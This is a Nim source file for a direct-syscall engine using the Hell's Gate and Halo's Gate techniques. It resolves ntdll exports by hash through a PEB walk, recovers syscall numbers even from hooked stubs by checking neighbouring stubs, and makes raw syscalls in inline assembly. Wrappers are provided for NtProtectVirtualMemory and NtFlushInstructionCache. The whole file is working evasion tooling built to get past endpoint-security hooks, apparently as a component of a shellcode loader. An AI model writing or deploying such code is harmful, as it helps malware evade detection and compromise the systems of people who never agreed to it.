# syscall.nim — Hell's Gate + Halo's Gate direct syscall engine
#
# Hell's Gate:  read SSN from `mov eax, <ssn>` (4C 8B D1 B8 XX 00 00 00) in ntdll stub
# Halo's Gate:  if stub is hooked (starts with E9 jmp), walk neighboring stubs ±1..±32
#               to find unhooked neighbor, infer SSN by offset
# Trampoline:   naked fn sets correct argument registers, loads SSN into eax, syscall

import defs, utils

# ─── PEB export walk ─────────────────────────────────────────────────────────

proc getProcFromPeb*(moduleHash: uint32, exportHash: uint32): pointer =
  # unsafe — walks PEB via raw pointer arithmetic
  var peb: uint
  {.emit: """
    __asm__ volatile ("movq %%gs:0x60, %0" : "=r"(`peb`));
  """.}
  if peb == 0: return nil

  let ldr       = cast[uint](cast[ptr uint](peb + 0x18)[])
  let listHead  = cast[ptr uint](ldr + 0x10)
  var flink     = cast[uint](listHead[])

  while true:
    let base     = cast[uint](cast[ptr pointer](flink + 0x30)[])
    let nameUs   = cast[ptr UNICODE_STRING](flink + 0x58)
    let nameBuf  = nameUs[].Buffer
    let nameLen  = int(nameUs[].Length) div 2

    if base != 0 and nameLen > 0:
      var mh: uint32 = 5381
      for i in 0 ..< nameLen:
        let c = cast[byte](cast[ptr uint16](cast[uint](nameBuf) + uint(i) * 2)[])
        let lc = if c >= byte('A') and c <= byte('Z'): c + 32 else: c
        mh = mh * 33 + uint32(lc)

      if mh == moduleHash:
        if cast[ptr uint16](base)[] != IMAGE_DOS_SIGNATURE: return nil
        let eLfanew  = uint(cast[ptr uint32](base + 0x3C)[])
        let optBase  = eLfanew + 4 + 20
        let expRva   = uint(cast[ptr uint32](base + optBase + 112)[])
        let expDir   = base + expRva
        let nNames   = int(cast[ptr uint32](expDir + 0x18)[])
        let namesRva = uint(cast[ptr uint32](expDir + 0x20)[])
        let ordsRva  = uint(cast[ptr uint32](expDir + 0x24)[])
        let funcsRva = uint(cast[ptr uint32](expDir + 0x1C)[])

        for i in 0 ..< nNames:
          let nameRva = uint(cast[ptr uint32](base + namesRva + uint(i) * 4)[])
          let namePtr = cast[ptr byte](base + nameRva)
          var eh: uint32 = 5381
          var j = 0
          while true:
            let b = cast[ptr byte](cast[uint](namePtr) + uint(j))[]
            if b == 0: break
            eh = eh * 33 + uint32(b)
            inc j
          if eh == exportHash:
            let ord    = uint(cast[ptr uint16](base + ordsRva + uint(i) * 2)[])
            let fnRva  = uint(cast[ptr uint32](base + funcsRva + ord * 4)[])
            return cast[pointer](base + fnRva)

    let next = cast[uint](cast[ptr uint](flink)[])
    if next == cast[uint](listHead[]): break
    flink = next

  nil

# ─── SSN extraction ───────────────────────────────────────────────────────────

proc extractSsn*(stub: ptr byte): uint16 =
  # unsafe — reads raw stub bytes
  let p = cast[uint](stub)
  if cast[ptr byte](p)[]     == 0x4C and
     cast[ptr byte](p + 1)[] == 0x8B and
     cast[ptr byte](p + 2)[] == 0xD1 and
     cast[ptr byte](p + 3)[] == 0xB8:
    let lo = uint16(cast[ptr byte](p + 4)[])
    let hi = uint16(cast[ptr byte](p + 5)[])
    return lo or (hi shl 8)

  if cast[ptr byte](p)[] == 0xE9:
    for delta in 1'u16 .. 32'u16:
      for sign in [1'i32, -1'i32]:
        let offset  = uint(delta) * 32
        let neighbor = if sign > 0:
                         cast[ptr byte](p + offset)
                       else:
                         cast[ptr byte](p - offset)
        let np = cast[uint](neighbor)
        if cast[ptr byte](np)[]     == 0x4C and
           cast[ptr byte](np + 1)[] == 0x8B and
           cast[ptr byte](np + 2)[] == 0xD1 and
           cast[ptr byte](np + 3)[] == 0xB8:
          let baseSsn = uint16(cast[ptr byte](np + 4)[]) or
                        (uint16(cast[ptr byte](np + 5)[]) shl 8)
          if sign > 0:
            return uint16(int32(baseSsn) - int32(delta))
          else:
            return uint16(int32(baseSsn) + int32(delta))
  0

proc resolveSsn*(name: string): uint16 =
  # unsafe
  let ntdllH = djb2(cast[seq[byte]]("ntdll.dll"))
  var hash: uint32 = 5381
  for b in name.toOpenArrayByte(0, name.len - 1):
    hash = hash * 33 + uint32(b)
  let stub = getProcFromPeb(ntdllH, hash)
  if stub == nil: return 0
  extractSsn(cast[ptr byte](stub))

# ─── Syscall trampoline (FIXED) ────────────────────────────────────────────────
#
# Bug in original Rust: did `mov r10, rcx` BEFORE `mov eax, ecx`, then
# did `mov r10, rcx` again after shifting, clobbering eax's intent.
# Fix: load SSN from ecx into eax FIRST, then shift arguments, then
# set r10=rcx (syscall ABI requirement).
#
# On entry: rcx=ssn, rdx=a1, r8=a2, r9=a3, [rsp+0x28]=a4
# We need: eax=ssn, r10=a1, rcx=a1... actually the NT syscall ABI is:
#   eax = SSN, r10 = rcx (first arg), rcx = first arg, rdx = second, etc.
#
# For NtXxx calls with (a1,a2,a3,a4,...):
#   mov eax, ecx       ; eax = ssn (first param)
#   mov rcx, rdx       ; rcx = a1 (was rdx)
#   mov rdx, r8        ; rdx = a2 (was r8)
#   mov r8,  r9        ; r8  = a3 (was r9)
#   mov r9,  [rsp+0x28]; r9  = a4 (from stack)
#   mov r10, rcx       ; r10 = rcx (syscall ABI: r10 mirrors rcx)
#   syscall
#   ret

proc syscallTrampoline*(ssn: uint32, a1, a2, a3, a4: uint): NTSTATUS {.asmNoStackFrame.} =
  {.emit: """
    __asm__(
      "mov %ecx, %eax\n\t"
      "mov %rdx, %rcx\n\t"
      "mov %r8, %rdx\n\t"
      "mov %r9, %r8\n\t"
      "movq 0x28(%rsp), %r9\n\t"
      "mov %rcx, %r10\n\t"
      "syscall\n\t"
      "ret\n\t"
    );
  """.}

# ─── Convenience wrapper ──────────────────────────────────────────────────────

proc doSyscall*(ssn: uint16, a1, a2, a3, a4, a5, a6: uint): NTSTATUS =
  # unsafe — inline syscall dispatch
  var ret: int32
  {.emit: """
    __asm__ volatile (
      "subq $0x50, %%rsp\n\t"
      "movq %[a5], 0x28(%%rsp)\n\t"
      "movq %[a6], 0x30(%%rsp)\n\t"
      "movq %[a1], %%r10\n\t"
      "movq %[a2], %%rdx\n\t"
      "movq %[a3], %%r8\n\t"
      "movq %[a4], %%r9\n\t"
      "movl %[ssn], %%eax\n\t"
      "syscall\n\t"
      "addq $0x50, %%rsp\n\t"
      "movl %%eax, %[ret]\n\t"
      : [ret] "=r" (`ret`)
      : [ssn] "r" ((unsigned int)`ssn`),
        [a1]  "r" (`a1`),
        [a2]  "r" (`a2`),
        [a3]  "r" (`a3`),
        [a4]  "r" (`a4`),
        [a5]  "r" (`a5`),
        [a6]  "r" (`a6`)
      : "rax", "rcx", "rdx", "r8", "r9", "r10", "r11", "memory"
    );
  """.}
  NTSTATUS(ret)

# ─── Typed wrappers ───────────────────────────────────────────────────────────

proc ntProtectVirtualMemory*(
  process: HANDLE,
  base:    ptr pointer,
  size:    ptr uint,
  newProt: uint32,
  oldProt: ptr uint32,
): NTSTATUS =
  # unsafe
  let ssn = resolveSsn("NtProtectVirtualMemory")
  doSyscall(ssn,
    cast[uint](process), cast[uint](base), cast[uint](size),
    uint(newProt), cast[uint](oldProt), 0)

proc ntFlushInstructionCache*(
  process: HANDLE,
  base:    pointer,
  size:    uint,
): NTSTATUS =
  # unsafe
  let ssn = resolveSsn("NtFlushInstructionCache")
  doSyscall(ssn, cast[uint](process), cast[uint](base), size, 0, 0, 0)
